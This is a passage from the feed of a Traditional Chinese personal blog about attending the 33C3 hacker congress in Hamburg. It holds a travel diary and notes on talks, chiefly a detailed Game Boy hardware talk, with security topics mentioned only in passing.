&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Macbook 上接了一個手持式的會發光的槍型裝置，可以幫你的全身外觀建模，讓後讓 3D 印表機列印出你的模型。  &lt;/li&gt;
&lt;li&gt;有人用電燈開關、挖了幾個空格的大木板，再加上自己焊的電路還有寫的程式，做出了可以兩個人互相比誰分數多的打地鼠遊戲。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Redemption Game" src="/files/33c3/redemption-game.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有 Food Hacker 現場在做分子料理  &lt;/li&gt;
&lt;li&gt;官方舉辦的大地遊戲：There is No Game  &lt;ul&gt;
&lt;li&gt;到大地遊戲的櫃台，有一部電腦，輸入自己的名字並從九種特質中選擇一種，接著會列印出一張名牌。  &lt;/li&gt;
&lt;li&gt;集滿九種不同特質的 9 個人後，到櫃台領取提示即可開始解謎。  &lt;/li&gt;
&lt;li&gt;會場中到處有柱狀的機器，需要插入鑰匙或按下密碼。  &lt;/li&gt;
&lt;li&gt;很像實體的 Wargame，據說還需要和其他隊伍合作才有辦法解完，但我們這部份沒有玩完，所以無法詳細描述。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;感想&lt;/h2&gt;
&lt;p&gt;真的是個很棒的 Conference，&lt;br /&gt;
各種方面都非常的 geek、非常的自在，&lt;br /&gt;
難怪 Opening Ceremony 的講者會有 post-conference depression。&lt;br /&gt;
能辦到第 33 屆真的很不簡單啊，&lt;br /&gt;
而且會期一直都是在歐洲的過年期間，&lt;br /&gt;
試想如果在臺灣的春節時間辦個 Conference，&lt;br /&gt;
有多少人會願意或有空參加？  &lt;/p&gt;
&lt;p&gt;有個感受到比較明顯差異的地方是，&lt;br /&gt;
德國這邊的 Civil Hacker 幾乎都是抱持著不信任政府的心態，&lt;br /&gt;
所以會期的四天並沒有看到任何政府官員來致詞，&lt;br /&gt;
而台灣的 g0v 算是站在幫助政府的角度，&lt;br /&gt;
這點是比較不一樣的，&lt;br /&gt;
我也不好評斷孰優孰劣。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;原本同行的朋友們是打算投稿 SITCON 2017 分享的，&lt;br /&gt;
但前幾天投稿結果出爐，&lt;br /&gt;
應該是因為跟主題不符合被刷掉了。&lt;br /&gt;
再加上其中一位同行的朋友在 OCF 工作，&lt;br /&gt;
OCF 希望他可以辦一場分享會講講 33C3 的事，&lt;br /&gt;
所以和我一同參加 33C3 的 3 位朋友要舉辦一個小小的分享會，&lt;br /&gt;
有興趣的人歡迎參加。  &lt;/p&gt;
&lt;p&gt;時間是 2017/02/04（六） 19:30~22:00&lt;br /&gt;
地點在 台北摩茲工寮（台北市中正區八德路一段 94 號 3F）&lt;br /&gt;
KKTIX 的報名頁面： &lt;a href="http://pellaeon-a9aa66.kktix.cc/events/33c3-sharing"&gt;http://pellaeon-a9aa66.kktix.cc/events/33c3-sharing&lt;/a&gt;&lt;br /&gt;
共筆頁面：&lt;a href="https://hackmd.io/EYMwpsDMAmCMwFpwCYDGCAsBOArAdgSwA4QQFYAGPEZLC6aPHWIA?both"&gt;https://hackmd.io/EYMwpsDMAmCMwFpwCYDGCAsBOArAdgSwA4QQFYAGPEZLC6aPHWIA?both&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;雖然我現在看好像已經額滿了，&lt;br /&gt;
不過當天應該會開個直播分享給沒辦法到現場的人。&lt;br /&gt;
至於直播連結的話應該就是會在一些社群網站上分享吧，&lt;br /&gt;
有興趣的人再注意一下。  &lt;/p&gt;
&lt;p&gt;我沒有參加的原因是因為星期六我人還沒回台北，&lt;br /&gt;
所以不會出現在現場，&lt;br /&gt;
但應該會鍵盤線上參與。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;33C3 全部演講的錄影，閒閒沒事可以拿來當工作 BGM，順便練英文聽力，有各種不同的腔調。  &lt;ul&gt;
&lt;li&gt;官方網站：&lt;a href="https://media.ccc.de/b/congress/2016"&gt;https://media.ccc.de/b/congress/2016&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Youtube：&lt;a href="https://www.youtube.com/playlist?list=PL_IxoDz1Nq2YqIhABZBqWZKxkL82HCQ5I"&gt;https://www.youtube.com/playlist?list=PL_IxoDz1Nq2YqIhABZBqWZKxkL82HCQ5I&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="33C3"></category><category term="Chaos Communication Congress"></category><category term="CCC"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (11)</title><link href="https://blog.m157q.tw/posts/2016/12/30/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-11/" rel="alternate"></link><published>2017-01-15T01:04:59+08:00</published><updated>2017-01-15T01:04:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-30:posts/2016/12/30/33c3-暨歐洲法荷德聖誕跨年遊-11/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/29/33c3-暨歐洲法荷德聖誕跨年遊-10"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (10)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 11 2016/12/30 Fri&lt;/h2&gt;
&lt;p&gt;有關 CCC 的簡介請參考：&lt;a href="/posts/2016/12/27/33c3-0"&gt;33C3 intro&lt;/a&gt;&lt;br /&gt;
有關本日 CCC 議程相關紀錄請參閱：&lt;a href="/posts/2016/12/30/33c3-day4"&gt;33C3 Day 4&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;今天去 CCC 會場之前先前往郵局去寄明信片，&lt;br /&gt;
到第 1 家郵局的時候遇到賣郵票的機器壞掉，&lt;br /&gt;
然後郵局也不給開放進入，&lt;br /&gt;
說要等 15 分鐘後才可以進入，&lt;br /&gt;
但時間已經十一點半左右，&lt;br /&gt;
德國的郵局中午的午休時間是從中午十二點到下午兩點，&lt;br /&gt;
所以再等久一點的話就要等很久，&lt;br /&gt;
於是在附近找另外一家郵局。  &lt;/p&gt;
&lt;p&gt;最後是找到漢堡市政廳附近的郵局。&lt;br /&gt;
幸好郵票機是能動的，&lt;br /&gt;
也還好身上的零錢夠，&lt;br /&gt;
買的時候才知道郵票機是不找零的，&lt;br /&gt;
零錢只會被換成郵票吐出來給你，&lt;br /&gt;
如果你不想把零錢換成郵票的話就不能買，&lt;br /&gt;
真的有夠鳥。&lt;br /&gt;
2016 年從德國寄國際明信片要 0.9 歐，&lt;br /&gt;
我身上剛好有 1 個 1 歐跟 2 個 0.5 歐，&lt;br /&gt;
所以買完就變成 2 張 0.9 歐跟 2 張 0.1 歐的郵票，&lt;br /&gt;
最後乾脆把要寄的 2 張明信片都貼上 0.9 + 0.1 的郵票，&lt;br /&gt;
反正留 0.1 的德國郵票也不知道要幹嘛。  &lt;/p&gt;
&lt;p&gt;之後又逛了一下附近的店家，&lt;br /&gt;
H&amp;amp;M 真的是挺便宜的，&lt;br /&gt;
然後去 WMF 晃了一下，&lt;br /&gt;
再去逛附近的百貨，&lt;br /&gt;
想要找小熊軟糖可是沒找著。&lt;br /&gt;
在百貨的超市買了不含退瓶費只要 0.99 的超便宜 CLUB-MATE，&lt;br /&gt;
還有口味有點神奇的櫻桃水之後，&lt;br /&gt;
就前往 CCC 的會場。  &lt;/p&gt;
&lt;p&gt;結束後到漢堡車站二樓吃一間德國的連鎖餐廳，&lt;br /&gt;
原本打算吃德國豬腳，&lt;br /&gt;
同行的朋友說這間他在柏林吃了很多次豬腳，&lt;br /&gt;
結果我們進去之後沒有豬腳可以吃，&lt;br /&gt;
吃完以後覺得品質不怎麼樣，&lt;br /&gt;
只是剛好今天一起吃飯的一位朋友會講德文，&lt;br /&gt;
所以店員顯得親切多了。  &lt;/p&gt;
&lt;p&gt;之後就去車站附近的 Generator Hostel 的 Luggage Room 拿寄放的行李，&lt;br /&gt;
去超市買了 2 包 1 KG 裝的小熊軟糖，&lt;br /&gt;
一包只要 3.99 歐，&lt;br /&gt;
然後還買了一包 2.99 歐的小小煙火組合。&lt;br /&gt;
怕等早上的飛機等到會睡著，&lt;br /&gt;
可以拿到外面去玩 XD&lt;br /&gt;
之後就搭地鐵前往 Hamburg Airport 站，&lt;br /&gt;
入住附近的 Airport Hostel Hamburg，&lt;br /&gt;
等待明天早上 6 點的飛機。  &lt;/p&gt;
&lt;p&gt;煙火真的超級便宜的啊，&lt;br /&gt;
有那種玩具總動員第 1 集拿來綁巴斯光年的煙火，&lt;br /&gt;
一個也才只要 5 歐而已，&lt;br /&gt;
原本很想買，&lt;br /&gt;
但考慮去機場附近放煙火不知道會不會有事，&lt;br /&gt;
所以就放棄了。  &lt;/p&gt;
&lt;p&gt;搭地鐵前往 Hamburg Airport 的時候遇到列車分車，&lt;br /&gt;
在地鐵上我才在問說為什麼車廂是不互通的，&lt;br /&gt;
朋友說這樣是為了方便分車，&lt;br /&gt;
結果就遇上了，&lt;br /&gt;
之後我們就下車往前面一個車廂移動，&lt;br /&gt;
結果剛剛搭的車廂就在後面分車了。&lt;br /&gt;
到新的車廂後，&lt;br /&gt;
遇上一個也來漢堡的台灣人，&lt;br /&gt;
剛好也是台中人，&lt;br /&gt;
就這樣聊了起來，&lt;br /&gt;
更巧的是下車之後發現要入住的是同一家 hostel，&lt;br /&gt;
原本和朋友打算要走路過去 hostel，&lt;br /&gt;
但剛剛遇到的那位台灣人打算搭計程車過去，&lt;br /&gt;
結果一上計程車後跟司機說了目的地，&lt;br /&gt;
司機很不悅得說這個距離只有 450M 只有收 6 歐他不想載，&lt;br /&gt;
結果剛剛認識的朋友直接跟司機抬價說他要給 10 歐，&lt;br /&gt;
司機才心不甘情不願的出發，&lt;br /&gt;
感覺原本想要趕我們下車。&lt;br /&gt;
過了幾分鐘後就到達 Airport Hostel Hamburg，&lt;br /&gt;
旅館還挺新的，設備也還算不錯，&lt;br /&gt;
價格我們是 4 個人住 73+2（城市稅）歐，&lt;br /&gt;
算起來一個人不到 20 歐，&lt;br /&gt;
只是因為要趕早上的飛機沒啥睡到有點沒那麼划算就是。&lt;br /&gt;
也有提供早餐，供應時間是早上七點到十點，&lt;br /&gt;
價錢好像是 6.5 歐左右，在櫃台的時候沒有聽清楚，&lt;br /&gt;
畢竟等到飯店供應早餐的時候我們早就 check out 了。  &lt;/p&gt;
&lt;p&gt;Check-in 完之後，&lt;br /&gt;
就等另外兩位朋友來旅館，&lt;br /&gt;
在等待的過程中除了洗澡以外，&lt;br /&gt;
還試了一下開鎖工具，&lt;br /&gt;
成功把我們住的那間上了鎖的窗戶打開了。&lt;br /&gt;
後來挑戰房門，但沒有成功。&lt;br /&gt;
之後另外兩位朋友也到了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/31/33c3-暨歐洲法荷德聖誕跨年遊-12"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (12)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Hamburg"></category></entry><entry><title>33c3 (4)</title><link href="https://blog.m157q.tw/posts/2016/12/30/33c3-4/" rel="alternate"></link><published>2017-02-04T20:46:07+08:00</published><updated>2017-02-04T20:46:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-30:posts/2016/12/30/33c3-4/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/29/33c3-3"&gt;33C3 (3)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;33C3 Day 4 (2016.12.30 Fri)&lt;/h2&gt;
&lt;h3&gt;&lt;a href="https://media.ccc.de/v/33c3-8089-lightning_talks_day_4"&gt;Day 4 Lightning talks&lt;/a&gt;&lt;/h3&gt;
&lt;h4&gt;WhatsApp Backdoor(/Bug?)&lt;/h4&gt;
&lt;p&gt;WhatsApp 在做 End-to-End encryption 的時候似乎是可以被 MITM 的  &lt;/p&gt;
&lt;p&gt;Report on April 10&lt;br /&gt;
Facebook said it's expected behavior&lt;br /&gt;
講者回應說這部應該是 expected behavior&lt;br /&gt;
直到兩天前仍然未修復  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;LibrePCB&lt;/h4&gt;
&lt;p&gt;提供一整套開發 PCB 的工具，&lt;br /&gt;
應該可以算是 PCB 的 IDE，&lt;br /&gt;
也把版本控制包含進去了。  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/LibrePCB/LibrePCB"&gt;https://github.com/LibrePCB/LibrePCB&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Rust in 5 minutes&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;More control and more safety.  &lt;/li&gt;
&lt;li&gt;System progrogrmming language.  &lt;/li&gt;
&lt;li&gt;Compiled language, optimization with LLVM, zero cost abstraction.  &lt;/li&gt;
&lt;li&gt;No null pointers, no dangling pointers, no data races.  &lt;/li&gt;
&lt;li&gt;Developed openly with RFCs.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Tindering Islam&lt;/h4&gt;
&lt;p&gt;把可蘭經的內容拿來像 Tinder 一樣讓使用者評價喜不喜歡這段經文，&lt;br /&gt;
還可以試著修改經文的內容讓其他使用者來評價你修改過的內容，&lt;br /&gt;
產生一個新版的可蘭經。  &lt;/p&gt;
&lt;p&gt;這個 talk 不少人拍手叫好 XD  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Orwell's law&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Current situation in Czech Republic  &lt;ul&gt;
&lt;li&gt;Censorship law passed  &lt;/li&gt;
&lt;li&gt;LEAD need court order to spy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要就是在講要爭取不被政府監視的權利  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;NC393-CS camera&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Hackable and Open Source Camera  &lt;ul&gt;
&lt;li&gt;Under GPL.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Jailbreaking Governmental Data: PDF becomes RDF&lt;/h4&gt;
&lt;p&gt;巴伐利亞政府喜歡把文件都存成 PDF，&lt;br /&gt;
但 PDF 其實很不開放，&lt;br /&gt;
所以講者把它們的 PDF 都轉成 RDF plus a simple HTML view。  &lt;/p&gt;
&lt;p&gt;寫了個程式做這件事，&lt;br /&gt;
先把 PDF 轉成 XML 再轉成 TTL 最後才轉成 RDF，&lt;br /&gt;
RDF 比較輕量，而且可以做 diff。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Meetings are broken in many many ways&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Some problems  &lt;ul&gt;
&lt;li&gt;Transparency  &lt;ul&gt;
&lt;li&gt;No agenda or not know by participants  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Relevancy  &lt;ul&gt;
&lt;li&gt;Topics not relevant to all participants  &lt;/li&gt;
&lt;li&gt;I have to be the meeting but I don't know why.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Workload  &lt;ul&gt;
&lt;li&gt;Preparation is done by a single person  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Solution?  &lt;ul&gt;
&lt;li&gt;Let participants take part in the preparation  &lt;/li&gt;
&lt;li&gt;Make the metting transparent, relevant and distribute the workload.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者提出了一個 web app 叫作 &lt;a href="https://meetling.org"&gt;Meetling&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Collaboratively draft an agenda, let participants propose and edit agenda items.  &lt;/li&gt;
&lt;li&gt;Share meetings by link (no registration required)  &lt;/li&gt;
&lt;li&gt;Simple to use  &lt;/li&gt;
&lt;li&gt;Stack: Python, Tornado, Redit, JavaScript  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://github.com/noyainrain/meetling"&gt;https://github.com/noyainrain/meetling&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;YaraRules Project&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;WTF is yara?  &lt;ul&gt;
&lt;li&gt;YARA is a tool aimed at helping malware researchers to identify and classify malware samples.  &lt;/li&gt;
&lt;li&gt;With YARA you can create descriptions of &lt;whatever&gt; based on textual or binary patterns.  &lt;/li&gt;
&lt;li&gt;Each rule consists of a set of strings and a boolean expression which determin the result.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yararules Analyzer  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://analysis.yararules.com"&gt;https://analysis.yararules.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Yara-Rules/rules"&gt;https://github.com/Yara-Rules/rules&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;The neveragain.tech pledge&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://neveragein.tech"&gt;https://neveragein.tech&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;CyberGreen 3.0&lt;/h4&gt;
&lt;p&gt;找人一起參與這個計劃，&lt;br /&gt;
提供資料來一起更好得防禦 DDoS。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;The Ultimate Game Boy Talk&lt;/h3&gt;
&lt;p&gt;這場真的講的超級棒！&lt;br /&gt;
而且超級好奇他的投影片是用哪個軟體製作的，&lt;br /&gt;
真的講的很清楚，&lt;br /&gt;
簡直就是在用 Gameboy 教計算機組織，&lt;br /&gt;
也許當年修計組的時候可以早點遇到類似這樣的教材的話，&lt;br /&gt;
可能就不會覺得很無趣了吧。&lt;br /&gt;
總之，&lt;br /&gt;
這場應該是我在 33C3 裡頭最喜歡的一場演講，&lt;br /&gt;
非常推薦花一個小時觀看一下影片，&lt;br /&gt;
我在聽這場 talk 之前從來不知道一個小小的 GameBoy 裏面藏了這麼多的學問。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;講者資訊  &lt;ul&gt;
&lt;li&gt;Michael Steil  &lt;/li&gt;
&lt;li&gt;@pagetable  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pagetable.com"&gt;http://www.pagetable.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;影片  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://media.ccc.de/v/33c3-8029-the_ultimate_game_boy_talk"&gt;https://media.ccc.de/v/33c3-8029-the_ultimate_game_boy_talk&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;介紹整個 GameBoy 的歷史，各種不同年代出的機種以及整個介紹。  &lt;/li&gt;
&lt;li&gt;和 NES, Commodore 64, Atari 2600, SNES 的規格做比較  &lt;/li&gt;
&lt;li&gt;講解各個 GameBoy 內部的電路板結構  &lt;ul&gt;
&lt;li&gt;DMG-CPU 1989 Nintendo Japan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHARP LR35902  &lt;ul&gt;
&lt;li&gt;支援部份 Intel 8080  &lt;/li&gt;
&lt;li&gt;支援部份 Zilog Z80 的 features  &lt;/li&gt;
&lt;li&gt;自己有些新 features  &lt;ul&gt;
&lt;li&gt;Zero Page  &lt;/li&gt;
&lt;li&gt;Stack  &lt;/li&gt;
&lt;li&gt;Store SP  &lt;/li&gt;
&lt;li&gt;Swap Nibbles  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用到不支援的 feature 會直接 crash  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ROM, Video RAM, External RAM, RAM, OAM RAM, I/O(FF00), HRAM(FF80)  &lt;/li&gt;
&lt;li&gt;BOOT ROM (0000-00FF)  &lt;ul&gt;
&lt;li&gt;Compare Logo  &lt;ul&gt;
&lt;li&gt;所以盜版的軟體如果 logo 不符合的話就沒辦法開啟  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Joypad Input  &lt;/li&gt;
&lt;li&gt;Serial Data Transfer  &lt;ul&gt;
&lt;li&gt;兩台 GameBoy 之間互相傳輸資料用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Timer  &lt;ul&gt;
&lt;li&gt;DIV: Divider Register  &lt;/li&gt;
&lt;li&gt;TIMA: Time Counter  &lt;/li&gt;
&lt;li&gt;TMA  &lt;/li&gt;
&lt;li&gt;TAC  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Interrupt Controller  &lt;ul&gt;
&lt;li&gt;IE (Interrupt Enable)  &lt;/li&gt;
&lt;li&gt;IF (Interrupt Flag)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sound Controller  &lt;ul&gt;
&lt;li&gt;Voice 1 to 4  &lt;ul&gt;
&lt;li&gt;Pulse A, Pulse B, Wave, Noise  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;have 5 registers each.  &lt;ul&gt;
&lt;li&gt;Control, Frequency, Volume, Length, Sweep  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NR50 用來控制左右聲道  &lt;/li&gt;
&lt;li&gt;Little Sound Dj  &lt;ul&gt;
&lt;li&gt;可以用這種  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pixel Processing Unit  &lt;ul&gt;
&lt;li&gt;160x144  &lt;/li&gt;
&lt;li&gt;4 shades of gray  &lt;/li&gt;
&lt;li&gt;20x18 background tiles  &lt;ul&gt;
&lt;li&gt;8x8 Pixel Tiles  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Background Tile Data  &lt;/li&gt;
&lt;li&gt;Window  &lt;ul&gt;
&lt;li&gt;拿來做 side bar 或是遊戲底下的狀態列  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sprites  &lt;ul&gt;
&lt;li&gt;OAM Entry  &lt;ul&gt;
&lt;li&gt;Position X  &lt;/li&gt;
&lt;li&gt;Position Y  &lt;/li&gt;
&lt;li&gt;Tile Number  &lt;/li&gt;
&lt;li&gt;Priority  &lt;ul&gt;
&lt;li&gt;0 會在最上面  &lt;/li&gt;
&lt;li&gt;1 會在下面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flip X  &lt;/li&gt;
&lt;li&gt;Flip Y  &lt;/li&gt;
&lt;li&gt;Palette  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;limitation  &lt;ul&gt;
&lt;li&gt;40 sprites total  &lt;/li&gt;
&lt;li&gt;10 sprites per line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Layers  &lt;ul&gt;
&lt;li&gt;LCD off, LCD on, Background, sprite  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VRAM Memory Map  &lt;/li&gt;
&lt;li&gt;Vertical Timing  &lt;ul&gt;
&lt;li&gt;top to bottom, left to right, 60 times a second  &lt;/li&gt;
&lt;li&gt;LYC interrupt  &lt;/li&gt;
&lt;li&gt;Changing SCX  &lt;ul&gt;
&lt;li&gt;for curve effect  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Horizontal Timing  &lt;ul&gt;
&lt;li&gt;PPU Timing  &lt;ul&gt;
&lt;li&gt;OAM Search  &lt;ul&gt;
&lt;li&gt;20 clocks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pixel Transfer  &lt;ul&gt;
&lt;li&gt;43+ clocks  &lt;/li&gt;
&lt;li&gt;144 lines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;H-Blank  &lt;ul&gt;
&lt;li&gt;51 clocks  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;VRAM Access  &lt;ul&gt;
&lt;li&gt;CPU need PPU to access Video RAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Game Timing  &lt;ul&gt;
&lt;li&gt;V-Blank 1,140 clocks  &lt;ul&gt;
&lt;li&gt;Move background map  &lt;/li&gt;
&lt;li&gt;Copy shadow OAM to OAM  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OAM DMA  &lt;/li&gt;
&lt;li&gt;Pixel Pipeline  &lt;ul&gt;
&lt;li&gt;Pixel FIFO  &lt;/li&gt;
&lt;li&gt;Pixel Mixing  &lt;/li&gt;
&lt;li&gt;Applying the Palettes  &lt;/li&gt;
&lt;li&gt;Colorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Development  &lt;ul&gt;
&lt;li&gt;rgbasm, rgblink  &lt;/li&gt;
&lt;li&gt;https://bgb.bircd.org  &lt;/li&gt;
&lt;li&gt;https://krikzz.com  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GameBoy Camera  &lt;ul&gt;
&lt;li&gt;GameBoy printer with thermal paper.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Ultimate series of CCC  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Security Nightmares&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8413-security_nightmares_0x11"&gt;https://media.ccc.de/v/33c3-8413-security_nightmares_0x11&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;這個 Talk 跟 HITCON 的奇葩駭客獎有點相似，&lt;br /&gt;
主要就兩個主持人在台上坐著，&lt;br /&gt;
講今年發生的一些資安事件，&lt;br /&gt;
然後預測一些明年可能會發生的資安問題，&lt;br /&gt;
然後不時吐嘈一下，&lt;br /&gt;
氣氛挺歡樂的。  &lt;/p&gt;
&lt;p&gt;因為是德文的議程，&lt;br /&gt;
加上英文翻譯有點延遲，&lt;br /&gt;
所以紀錄可能不會那麼詳細。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2016 回顧  &lt;ul&gt;
&lt;li&gt;相片分享軟體被駭  &lt;/li&gt;
&lt;li&gt;35K mongo db 有對外 port  &lt;/li&gt;
&lt;li&gt;93M 選民資料有 64% 沒有註明密件、52% 沒有備份  &lt;/li&gt;
&lt;li&gt;無人車的安全問題  &lt;ul&gt;
&lt;li&gt;寫個無人車的木馬就可以直接有個 car-sharing service 了  &lt;/li&gt;
&lt;li&gt;有個無人車的勒索軟體的話，就可以直接和車主表示：「你的車現在在幫我送披薩，如果你想要你的車的話，請付我錢。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Makro-Vritus-Renaissance  &lt;/li&gt;
&lt;li&gt;ZigBee: Exploit  &lt;/li&gt;
&lt;li&gt;Philips Hue  &lt;ul&gt;
&lt;li&gt;用個無人機飛過去就可以讓整條街變成 RGB 燈泡了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Samsung Note 7  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;Technical Debt @ home  &lt;/li&gt;
&lt;li&gt;Security update should be seperated from feature update.  &lt;/li&gt;
&lt;li&gt;Data-Dump-Aggregation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;"But I am not sure if you have the security you need." - Trump 2016.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;聽的真的很痛苦，&lt;br /&gt;
覺得如果明年要來的話應該要認真學一下德文，&lt;br /&gt;
不然實在有點難融入。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;33C3 Closing Ceremony&lt;/h3&gt;
&lt;p&gt;影片：&lt;a href="https://media.ccc.de/v/33c3-8428-33c3_closing_ceremony"&gt;https://media.ccc.de/v/33c3-8428-33c3_closing_ceremony&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;一樣是德文，&lt;br /&gt;
不像 Opening 是英文，&lt;br /&gt;
總之就是很歡樂的氣氛，&lt;br /&gt;
然後播了 Back to Future 的電影片段，&lt;br /&gt;
